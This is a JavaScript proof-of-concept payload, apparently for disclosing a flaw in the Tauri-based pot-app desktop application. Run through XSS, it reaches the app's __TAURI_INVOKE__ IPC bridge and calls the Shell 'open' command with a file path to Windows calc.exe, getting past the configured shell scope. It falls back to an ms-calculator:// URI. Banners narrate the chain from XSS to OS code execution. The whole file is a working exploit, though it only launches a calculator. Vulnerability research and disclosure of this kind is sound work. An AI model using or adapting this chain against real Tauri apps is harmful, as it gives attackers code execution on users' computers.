var top = window.top || window.parent || window;
var invoke = top.__TAURI_INVOKE__;
var CONF = '/home/honey/.config/com.pot-app.desktop';

function showBanner(txt, bg) {
    var b = top.document.getElementById('cpm-xss-rce') || top.document.createElement('div');
    b.id = 'cpm-xss-rce';
    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:'+(bg||'#1a5c2a')+';color:#fff;font-weight:bold;font-size:11px;padding:6px 12px;text-align:left;font-family:monospace;white-space:pre-wrap;word-break:break-all';
    b.textContent = txt;
    if (!b.parentNode) top.document.body.appendChild(b);
}

showBanner('XSS → Tauri IPC → scope bypass via shell.open...');

(async function() {
    try {
        await invoke('tauri', { __tauriModule: 'Shell', message: {
            cmd: 'open',
            path: 'file:///mnt/c/Windows/System32/calc.exe',
            with: null
        }});
        showBanner(
            'SCOPE BYPASS + RCE\n' +
            'shell.open("file:///mnt/c/Windows/System32/calc.exe")\n' +
            '→ xdg-open → wslview → cmd.exe /c start calc.exe\n' +
            'Windows Calculator launched.\n\n' +
            'shell.execute scope: BLOCKED\n' +
            'shell.open scope (".*"): BYPASSED\n' +
            'Escalation: XSS → __TAURI_INVOKE__ → shell.open → OS RCE'
        );
    } catch(e) {
        try {
            await invoke('tauri', { __tauriModule: 'Shell', message: {
                cmd: 'open', path: 'ms-calculator://', with: null
            }});
            showBanner('calc via ms-calculator:// URI fired!', '#1a5c2a');
        } catch(e2) {
            showBanner('shell.open err: ' + e + '\nfallback: ' + e2, '#7d3c00');
        }
    }
})();
